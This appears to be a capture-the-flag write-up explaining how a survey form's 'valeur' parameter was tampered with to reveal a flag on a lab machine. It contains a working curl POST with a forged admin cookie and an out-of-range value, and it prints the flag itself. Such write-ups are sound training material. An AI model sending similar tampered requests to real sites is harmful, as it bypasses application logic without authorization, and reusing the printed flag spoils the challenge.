## 🧩 Solution to the Challenge – Parameter Tampering in Survey Submission

### 🔍 Discovery

While analyzing the survey page of the site:

<img width="1437" height="852" alt="Capture d’écran 2025-07-14 à 17 29 50" src="https://github.com/user-attachments/assets/335308cd-410e-4f80-b83e-05e7c5c8508a" />


I noticed that the form submitted two parameters:

<img width="1136" height="604" alt="Capture d’écran 2025-07-11 à 17 22 50" src="https://github.com/user-attachments/assets/075c3ed3-5c03-4626-ab92-3055cd845003" />


The full POST request looked like this:

<img width="1422" height="753" alt="Capture d’écran 2025-07-11 à 18 05 34" src="https://github.com/user-attachments/assets/79d1157f-3826-4ba8-9584-1bfb259ea1b7" />


The `valeur` parameter seemed suspicious. I decided to test whether altering it manually could change the application’s behavior.

---

### 🧪 Exploitation

To exploit this, I sent a modified request using **Burp Suite** or **curl**, changing the `valeur` field to an unexpected number:

``curl -X POST "http://192.168.1.56/?page=survey" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: I_am_admin=68934a3e9455fa72420237eb05902327" \
  --data "sujet=2&valeur=888888"``

After sending this payload, the server responded differently — revealing the hidden **flag**.

```03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa```

---

### 🛠️ Technical Insight

The challenge relied on **parameter-based access control**. The server used the `valeur` parameter directly in logic without proper validation or bounds checking.

Since this parameter is **fully controlled by the client**, modifying it allowed bypassing the expected workflow and accessing sensitive content — in this case, the flag.

This is a classic example of **parameter tampering**, where application logic can be manipulated by editing user-supplied fields.

---

### ✅ Conclusion

> 🧠 **Takeaway**: Always ensure that critical logic on the server is protected from client-side manipulation. Never trust form fields or URL parameters for decision-making without proper validation and authorization.
